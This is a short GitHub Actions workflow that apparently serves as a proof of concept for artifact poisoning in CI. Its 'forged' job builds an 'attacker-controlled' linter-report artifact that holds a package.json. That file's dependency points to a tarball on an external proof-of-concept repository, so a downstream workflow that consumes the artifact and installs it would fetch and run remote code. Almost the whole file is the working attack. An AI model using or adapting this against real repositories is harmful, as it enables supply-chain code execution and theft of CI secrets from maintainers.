name: PR validation
on:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Craft attacker-controlled linter-report artifact
        run: |
          mkdir -p payload
          printf '%s\n' '{"name":"p","version":"1.0.0","private":true,"dependencies":{"gray-matter":"https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/gray-matter-4.0.5.tgz"}}' > payload/package.json
          printf 'attacker controlled lint report\n' > payload/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
          ls -la payload
      - name: Upload linter report
        uses: actions/upload-artifact@v4
        with:
          name: linter-report
          path: payload/
